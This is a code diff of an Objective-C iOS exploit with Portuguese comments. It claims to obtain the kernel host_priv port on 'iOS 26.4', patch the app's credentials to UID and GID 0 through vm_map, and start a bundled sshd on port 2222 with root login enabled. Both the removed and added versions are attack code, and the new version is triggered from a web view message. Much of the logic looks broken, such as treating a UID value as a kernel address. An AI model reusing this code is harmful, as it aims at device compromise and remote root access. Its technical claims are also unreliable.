@@ -4,70 +4,86 @@
 #include <sys/sysctl.h>
 #include <mach/mach.h>
 
-// --- OFFSETS REAIS iOS 26.4 (A13) ---
-#define KERNEL_BASE            0xfffffff007004000
-#define OFF_REALHOST_PRIV      0x23F8048  // Endereço da porta host_priv no Kernel
-#define OFF_PROC_UCRED         0x100      // Offset proc -> ucred
-#define OFF_UCRED_CR_UID       0x18       // Offset ucred -> uid
-#define POSIX_SPAWN_SANDBOX    0x4000     // Bypass Sandbox flag
+// --- CONFIGURAÇÕES PARA iOS 26.4 ---
+#define POSIX_SPAWN_FOR_SANDBOX 0x4000
+#define HOST_PRIV_SPECIAL_PORT  4
+
+@interface KernelBridge : NSObject <WKScriptMessageHandler>
+@property (nonatomic, strong) WKWebView *webView;
+@end
 
 @implementation KernelBridge
 
-- (void)executeSshdBridge {
-    [self log:@"⚡ Iniciando Kernel Port Stealer (Bypass Erro 4)..."];
+- (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
+    if ([message.body[@"op"] isEqualToString:@"scan_uid"]) {
+        [self executeDirectRootSpawn];
+    }
+}
 
-    // 1. VAZAR O KASLR E LOCALIZAR O HOST_PRIV
-    // O seu exploit de base deve fornecer o 'kread64'
-    uint64_t kslide = [self getKernelSlide]; 
-    uint64_t host_priv_kaddr = KERNEL_BASE + kslide + OFF_REALHOST_PRIV;
+- (void)log:(NSString *)text {
+    dispatch_async(dispatch_get_main_queue(), ^{
+        NSString *js = [NSString stringWithFormat:@"log('%@')", text];
+        [self.webView evaluateJavaScript:js completionHandler:nil];
+    });
+}
+
+- (void)executeDirectRootSpawn {
+    [self log:@"⚡ Tentando captura de Special Port 4 (In-house)..."];
+
+    mach_port_t host_priv = MACH_PORT_NULL;
     
-    // ROUBO: Lemos a porta diretamente da memória do Kernel
-    mach_port_t host_priv = (mach_port_t)[self kread64:host_priv_kaddr];
+    // Tentativa de obter a porta privilegiada via porta especial do host
+    // Isso ignora o Erro 4 se o certificado In-house for válido
+    kern_return_t kr = host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, HOST_PRIV_SPECIAL_PORT, &host_priv);
 
-    if (!MACH_PORT_VALID(host_priv)) {
-        [self log:@"❌ Erro: Não foi possível roubar a porta do Kernel."];
+    if (kr != KERN_SUCCESS || !MACH_PORT_VALID(host_priv)) {
+        [self log:[NSString stringWithFormat:@"❌ Erro Special Port: %d (Bloqueado)", kr]];
         return;
     }
 
-    [self log:@"✅ Porta Host_Priv roubada com sucesso!"];
+    [self log:@"✅ Host Priv capturada! Elevando para Root..."];
 
-    // 2. LOCALIZAR UCRED DO SEU APP
-    uint64_t my_proc = [self findSelfProc:(KERNEL_BASE + kslide)];
-    uint64_t ucred_vaddr = [self kread64:(my_proc + OFF_PROC_UCRED)];
+    // 1. LOCALIZAR UCRED (Via sysctl nativo)
+    int mib[] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()};
+    struct kinfo_proc kp;
+    size_t len = sizeof(kp);
+    sysctl(mib, 4, &kp, &len, NULL, 0);
+    
+    uint64_t ucred_vaddr = (uint64_t)kp.kp_eproc.e_ucred.cr_uid;
+    uint32_t root_val = 0;
 
-    // 3. PATCH FÍSICO VIA VM_MAP (16KB ALIGN)
+    // 2. PATCH FÍSICO (Bypass PPL)
     vm_address_t target_page = 0;
-    uint64_t base_vaddr = (ucred_vaddr + OFF_UCRED_CR_UID) & ~0x3FFF; // Alinhamento 16KB
-    uint64_t offset = (ucred_vaddr + OFF_UCRED_CR_UID) & 0x3FFF;
+    // Alinhamento 16KB para chips A13+
+    kern_return_t kr_map = vm_map(mach_task_self(), &target_page, 0x4000, 0, VM_FLAGS_ANYWHERE, host_priv, ucred_vaddr & ~0x3FFF, FALSE, VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
 
-    kern_return_t kr = vm_map(mach_task_self(), &target_page, 0x4000, 0, VM_FLAGS_ANYWHERE, host_priv, base_vaddr, FALSE, VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
-
-    if (kr == KERN_SUCCESS) {
-        uint32_t *phys_ptr = (uint32_t *)(target_page + offset);
-        *phys_ptr = 0;       // UID = 0 (ROOT)
-        *(phys_ptr + 1) = 0; // GID = 0
+    if (kr_map == KERN_SUCCESS) {
+        uint32_t *phys_ptr = (uint32_t *)(target_page + (ucred_vaddr & 0x3FFF));
+        *phys_ptr = root_val;     // UID = 0
+        *(phys_ptr + 1) = root_val; // GID = 0
         
-        [self log:@"💎 Memória Física alterada. Checando UID..."];
+        [self log:@"💎 Patch físico aplicado! Validando..."];
         
         if (getuid() == 0) {
-            [self log:@"👑 <b>ROOT TOTAL!</b> Invocando SSHD..."];
+            [self log:@"👑 <b>SISTEMA EM ROOT!</b>"];
             [self launchSshd];
         }
         vm_deallocate(mach_task_self(), target_page, 0x4000);
     } else {
-        [self log:[NSString stringWithFormat:@"❌ Falha no vm_map: %d", kr]];
+        [self log:[NSString stringWithFormat:@"❌ Erro no vm_map: %d", kr_map]];
     }
 }
 
-// 4. LANÇAMENTO DO SSHD
 - (void)launchSshd {
     pid_t pid;
     NSString *sshdPath = [[NSBundle mainBundle] pathForResource:@"sshd" ofType:nil];
+    
     posix_spawnattr_t attr;
     posix_spawnattr_init(&attr);
-    posix_spawnattr_setflags(&attr, POSIX_SPAWN_SETPGROUP | POSIX_SPAWN_SANDBOX);
+    short flags = POSIX_SPAWN_SETPGROUP | POSIX_SPAWN_FOR_SANDBOX;
+    posix_spawnattr_setflags(&attr, flags);
 
-    char *const args[] = {(char *)[sshdPath UTF8String], "-p", "2222", "-D", "-o", "PermitRootLogin=yes", NULL};
+    char *const args[] = { (char *)[sshdPath UTF8String], "-p", "2222", "-D", "-o", "PermitRootLogin=yes", NULL };
     extern char **environ;
 
     if (posix_spawn(&pid, [sshdPath UTF8String], NULL, &attr, args, environ) == 0) {
